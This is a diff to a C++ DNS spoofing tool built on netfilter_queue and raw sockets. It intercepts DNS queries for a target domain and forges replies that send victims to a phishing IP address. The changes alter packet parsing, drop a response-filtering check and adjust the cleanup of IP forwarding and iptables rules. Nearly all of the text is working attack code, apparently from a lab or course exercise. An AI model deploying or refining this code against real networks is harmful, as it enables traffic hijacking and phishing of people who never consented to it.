@@ -4,7 +4,6 @@
 #include <arpa/inet.h>
 #include <netinet/ip.h>
 #include <netinet/udp.h>
-#include <linux/netfilter.h>
 #include <libnetfilter_queue/libnetfilter_queue.h>
 #include <unistd.h>
 #include <csignal>
@@ -124,7 +123,6 @@ void send_spoof_response(struct iphdr* orig_iph, struct udphdr* orig_udph, unsig
     in_addr addr;
     inet_aton(PHISHING_IP, &addr);
     memcpy(resp + ans_pos, &addr.s_addr, 4);
-    ans_pos += 4;
 
     // 發送
     int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
@@ -145,6 +143,8 @@ void signal_handler(int signum) {
         if(nfd){
             close(nfd);
         }
+        CLEAN_FORWARD();
+        exit(0);
     }
 }
 
@@ -161,12 +161,7 @@ static int callback(struct nfq_q_handle* qh, struct nfgenmsg* nfmsg, struct nfq_
             struct udphdr* udph = (struct udphdr*)(packet + iph->ihl * 4);
             if (ntohs(udph->dest) == 53){
                 unsigned char* dns = packet + iph->ihl * 4 + sizeof(struct udphdr);
-                DNS_header* dns_hdr = (DNS_header*)dns;
-                // Ignore DNS responses (QR = 1)
-                if (ntohs(dns_hdr->flags) & 0x8000) {
-                    return nfq_set_verdict(qh, packet_id, NF_ACCEPT, 0, nullptr);
-                }
-                int dns_query_len = get_question_len(dns);
+                int dns_query_len = payload_len - (iph->ihl * 4) - sizeof(struct udphdr);
                 string DOMAIN = parse_domain(dns);
                 if (DOMAIN == TARGET_DOMAIN){
                     cout << "INTERCEPTED query for "<< DOMAIN << endl;
@@ -190,6 +185,7 @@ void CLEAN_IPTABLES(){
 
 void CLEAN_FORWARD(){
     system("sudo sysctl -w net.ipv4.ip_forward=0");
+    cout << "FORWARD ClEANED " << endl;
     CLEAN_IPTABLES();
 }
 
@@ -222,6 +218,5 @@ int main (){
         }
     }
 
-    CLEAN_FORWARD();
     return 0;
 }
